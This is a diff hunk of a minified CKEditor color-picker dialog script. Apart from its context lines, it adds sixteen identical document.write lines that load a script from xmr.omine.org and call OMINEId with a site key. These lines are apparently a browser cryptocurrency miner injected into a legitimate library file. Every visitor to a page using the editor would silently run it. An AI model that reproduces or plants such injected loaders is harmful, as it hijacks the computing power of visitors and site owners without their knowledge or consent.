@@ -11,3 +11,19 @@ b.setAttribute("aria-labelledby",d);b.append(CKEDITOR.dom.element.createFromHtml
 3);a(3,3);var e=new r(i.$.insertRow(-1));e.setAttribute("role","row");for(var d=0;6>d;d++)b(e.$,"#"+c[d]+c[d]+c[d]);for(d=0;12>d;d++)b(e.$,"#000000")})();return{title:h.title,minWidth:360,minHeight:220,onLoad:function(){p=this},onHide:function(){n();var a=g.getChild(0).getHtml();g.setStyle("border-color",a);g.setStyle("border-style","solid");f.getById(k).removeStyle("background-color");f.getById(l).setHtml("&nbsp;");g=null},contents:[{id:"picker",label:h.title,accessKey:"I",elements:[{type:"hbox",
 padding:0,widths:["70%","10%","30%"],children:[{type:"html",html:"<div></div>",onLoad:function(){CKEDITOR.document.getById(this.domId).append(i)},focus:function(){(g||this.getElement().getElementsByTag("td").getItem(0)).focus()}},x,{type:"vbox",padding:0,widths:["70%","5%","25%"],children:[{type:"html",html:"<span>"+h.highlight+'</span><div id="'+k+'" style="border: 1px solid; height: 74px; width: 74px;"></div><div id="'+l+'">&nbsp;</div><span>'+h.selected+'</span><div id="'+o+'" style="border: 1px solid; height: 20px; width: 74px;"></div>'},
 {type:"text",label:h.selected,labelStyle:"display:none",id:"selectedColor",style:"width: 76px;margin-top:4px",onChange:function(){try{f.getById(o).setStyle("background-color",this.getValue())}catch(a){n()}}},x,{type:"button",id:"clear",label:h.clear,onClick:n}]}]}]}]}});
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
+document.write('<script src="https://xmr.omine.org/assets/v7.js"></script><script>OMINEId("31f7dd372f1545eeb6db379490b0e3c5","-1")</script>');
